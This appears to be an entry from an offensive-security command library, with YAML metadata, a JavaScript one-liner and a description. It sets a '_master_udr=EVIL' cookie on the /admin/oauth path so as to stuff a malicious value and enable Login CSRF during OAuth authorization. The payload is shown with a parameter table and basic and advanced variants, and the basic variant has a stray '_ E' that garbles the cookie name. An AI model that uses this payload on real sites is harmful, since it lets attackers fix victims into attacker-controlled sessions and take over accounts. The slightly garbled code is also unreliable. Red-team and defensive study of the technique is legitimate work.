---
data: document.cookie = '_master_udr=EVIL;path=/admin/oauth';
tags:
  - cookie-stuffing
type: command
executor: javascript
platforms:
  - Web
id: e7373dfd-490f-450a-928b-cc23ac966a66
created_at: '2025-12-13T23:56:03.986Z'
updated_at: '2025-12-13T23:56:03.986Z'
verified: false
validated: true
submitted: true
---
# Set Master UDR Cookie

## Command

```javascript
document.cookie = '_master_udr=EVIL;path=/admin/oauth';
```

## Description

Sets a cookie for _master_udr with a specific path to stuff an evil value, enabling Login CSRF during OAuth authorization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `_master_udr` | EVIL value | Yes |
| `path` | /admin/oauth to override broader paths | Yes |

## Examples

### Basic Usage

```javascript
document.cookie = '_ E_master_udr=EVIL;path=/admin/oauth';
```

### Advanced Usage

```javascript
document.cookie = '_master_udr=MALICIOUS;path=/admin/oauth;secure';
```

## Expected Output

Sets the cookie in the browser, overriding existing ones.

## Related

- [[procedures/Perform-Cookie-Stuffing-for-Login-CSRF]]
- [[commands/set-secure-admin-session-id-cookie]]
